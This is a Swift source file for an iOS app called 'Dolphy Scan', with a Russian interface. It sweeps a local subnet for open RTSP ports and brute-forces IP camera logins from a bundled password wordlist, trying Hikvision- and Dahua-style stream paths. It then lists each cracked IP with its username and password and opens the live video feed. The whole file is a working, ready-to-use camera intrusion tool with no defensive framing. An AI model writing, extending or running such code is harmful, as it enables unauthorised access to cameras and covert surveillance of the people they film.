import SwiftUI
import Network
import UIKit
import MobileVLCKit

struct Credential: Hashable { let user: String; let pass: String }
struct CameraHit: Identifiable {
    let id = UUID()
    let ip: String
    let user: String
    let pass: String
    let rtspPath: String
}

// MARK: - Network Engine
final class NetworkTool: ObservableObject {
    @Published var logs = ""
    @Published var isScanning = false
    @Published var progress: Double = 0
    @Published var hits: [CameraHit] = []
    private var credentials: [Credential] = []
    private var currentTask: Task<Void, Never>?

    init() { loadWordlist() }
    
    func loadWordlist() {
        guard let path = Bundle.main.path(forResource: "passwords", ofType: "txt"),
              let content = try? String(contentsOfFile: path, encoding: .utf8) else { return }
        var list: [Credential] = []
        for line in content.components(separatedBy: .newlines) {
            if let idx = line.firstIndex(of: ":") {
                list.append(Credential(user: String(line[..<idx]), pass: String(line[line.index(after: idx)...])))
            }
        }
        credentials = list
    }

    func log(_ text: String) { DispatchQueue.main.async { self.logs += text + "\n" } }
    func clear() { logs = ""; hits = []; progress = 0 }
    
    func stopAllTasks() {
        currentTask?.cancel()
        currentTask = nil
        DispatchQueue.main.async { self.isScanning = false; self.progress = 0; self.log("[SYS] Процессы убиты.") }
    }

    func startScan(subnet: String) {
        stopAllTasks()
        isScanning = true
        clear()
        currentTask = Task {
            for i in 1...254 {
                if Task.isCancelled { break }
                let ip = "\(subnet).\(i)"
                if await checkPort(host: ip, port: 554) {
                    await bruteRTSP(ip: ip)
                }
                DispatchQueue.main.async { self.progress = Double(i) / 254.0 }
                try? await Task.sleep(nanoseconds: 50_000_000)
            }
            DispatchQueue.main.async { self.isScanning = false; self.log("[SYS] Сканирование завершено.") }
        }
    }

    func checkPort(host: String, port: UInt16) async -> Bool {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: .init(host), port: .init(rawValue: port)!, using: .tcp)
            var done = false
            conn.stateUpdateHandler = { state in
                if case .ready = state, !done { done = true; cont.resume(returning: true); conn.cancel() }
                else if case .failed = state, !done { done = true; cont.resume(returning: false) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 0.4) {
                if !done { done = true; conn.cancel(); cont.resume(returning: false) }
            }
        }
    }

    func bruteRTSP(ip: String) async {
        let paths = ["/Streaming/Channels/101", "/cam/realmonitor?channel=1&subtype=0"]
        for cred in credentials {
            if Task.isCancelled { return }
            for path in paths {
                if await testRTSPAuth(url: "rtsp://\(cred.user):\(cred.pass)@\(ip):554\(path)") {
                    log("[+] НАЙДЕНО: \(ip) | \(cred.user):\(cred.pass)")
                    DispatchQueue.main.async { self.hits.append(CameraHit(ip: ip, user: cred.user, pass: cred.pass, rtspPath: path)) }
                    return
                }
            }
        }
    }

    func testRTSPAuth(url: String) async -> Bool {
        return await withCheckedContinuation { cont in
            guard let components = URLComponents(string: url), let host = components.host else { cont.resume(returning: false); return }
            let conn = NWConnection(host: .init(host), port: 554, using: .tcp)
            var done = false
            let auth = "\(components.user ?? ""):\(components.password ?? "")".data(using: .utf8)!.base64EncodedString()
            let req = "DESCRIBE \(url) RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic \(auth)\r\n\r\n"
            conn.stateUpdateHandler = { state in
                if case .ready = state {
                    conn.send(content: req.data(using: .utf8), completion: .contentProcessed { _ in
                        conn.receive(minimumIncompleteLength: 1, maximumLength: 1024) { data, _, _, _ in
                            defer { if !done { done = true; conn.cancel() } }
                            if let data = data, let str = String(data: data, encoding: .utf8), str.contains("200 OK") {
                                cont.resume(returning: true); return
                            }
                            cont.resume(returning: false)
                        }
                    })
                } else if case .failed = state, !done { done = true; cont.resume(returning: false) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 1.5) {
                if !done { done = true; conn.cancel(); cont.resume(returning: false) }
            }
        }
    }
}

// MARK: - VLC Player
struct VLCPlayerView: UIViewRepresentable {
    let url: URL
    @State private var player = VLCMediaPlayer()
    
    func makeUIView(context: Context) -> UIView {
        let view = UIView()
        view.backgroundColor = .black
        player.drawable = view
        player.media = VLCMedia(url: url)
        player.play()
        return view
    }
    func updateUIView(_ uiView: UIView, context: Context) { player.drawable = uiView }
}

// MARK: - Clean UI
struct ContentView: View {
    @StateObject var net = NetworkTool()
    @State private var subnet = "192.168.1"
    
    var body: some View {
        TabView {
            ToolsView(net: net, subnet: $subnet)
                .tabItem { Label("Инструменты", systemImage: "network") }
            CamerasView(net: net)
                .tabItem { Label("Камеры", systemImage: "video.fill") }
        }
        .preferredColorScheme(.dark)
    }
}

struct ToolsView: View {
    @ObservedObject var net: NetworkTool
    @Binding var subnet: String
    
    var body: some View {
        NavigationView {
            VStack(spacing: 20) {
                HStack {
                    Image(systemName: "wifi.router.fill").foregroundColor(.blue)
                    TextField("Подсеть", text: $subnet).keyboardType(.numbersAndPunctuation)
                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(10)
                
                Button(action: { net.startScan(subnet: subnet) }) {
                    Text(net.isScanning ? "Сканирую..." : "Начать поиск камер")
                        .font(.headline).foregroundColor(.white).padding()
                        .frame(maxWidth: .infinity).background(Color.blue).cornerRadius(10)
                }.disabled(net.isScanning)
                
                if net.isScanning {
                    ProgressView(value: net.progress).padding()
                    Button("ОСТАНОВИТЬ", action: { net.stopAllTasks() }).foregroundColor(.red)
                }
                
                ScrollView {
                    Text(net.logs.isEmpty ? "Лог пуст" : net.logs)
                        .font(.system(.caption, design: .monospaced))
                        .foregroundColor(.gray)
                        .frame(maxWidth: .infinity, alignment: .leading)
                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(10)
            }
            .padding().navigationTitle("Dolphy Scan")
        }
    }
}

struct CamerasView: View {
    @ObservedObject var net: NetworkTool
    @State private var selectedHit: CameraHit?
    
    var body: some View {
        NavigationView {
            List(net.hits) { hit in
                Button(action: { selectedHit = hit }) {
                    HStack {
                        Image(systemName: "video.fill").foregroundColor(.green)
                        VStack(alignment: .leading) {
                            Text(hit.ip).font(.headline)
                            Text("\(hit.user):\(hit.pass)").font(.caption).foregroundColor(.gray)
                        }
                    }
                }
            }
            .navigationTitle("Найденные камеры")
            .sheet(item: $selectedHit) { hit in
                VStack {
                    VLCPlayerView(url: URL(string: "rtsp://\(hit.ip):554\(hit.rtspPath)")!)
                        .aspectRatio(16/9, contentMode: .fit)
                    Text("LIVE: \(hit.ip)").font(.caption).padding()
                }.background(Color.black.edgesIgnoringSafeArea(.all))
            }
        }
    }
}
